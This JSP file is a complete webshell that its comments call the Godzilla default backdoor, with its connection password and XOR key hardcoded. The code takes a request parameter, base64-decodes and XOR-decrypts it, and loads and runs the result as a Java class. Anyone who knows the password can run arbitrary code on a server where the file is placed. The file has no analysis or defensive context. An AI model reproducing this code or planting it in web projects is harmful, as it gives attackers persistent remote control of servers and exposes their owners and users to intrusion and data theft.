<%!
// 哥斯拉 (Godzilla) JSP 默认马
// 连接密码: pass
// 密钥: 3c6e0b8a9c15224a (MD5(pass)[0:16])
String xc="3c6e0b8a9c15224a";
String pass="pass";
String md5=md5(pass+xc);
String md5(String s){String ret=null;try{java.security.MessageDigest m;m=java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(),0,s.length());ret=new java.math.BigInteger(1,m.digest()).toString(16).toUpperCase();}catch(Exception e){}return ret;}
class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb,int off,int len){return super.defineClass(cb,off,len);}}
%><%try{byte[] data=null;String k=request.getParameter(pass);if(k!=null&&!k.isEmpty()){data=new sun.misc.BASE64Decoder().decodeBuffer(k);int len=data.length;for(int i=0;i<len;i++){data[i]=(byte)(data[i]^xc.charAt(i%16));}new X(this.getClass().getClassLoader()).Q(data,0,data.length).newInstance();}}catch(Exception e){}
%>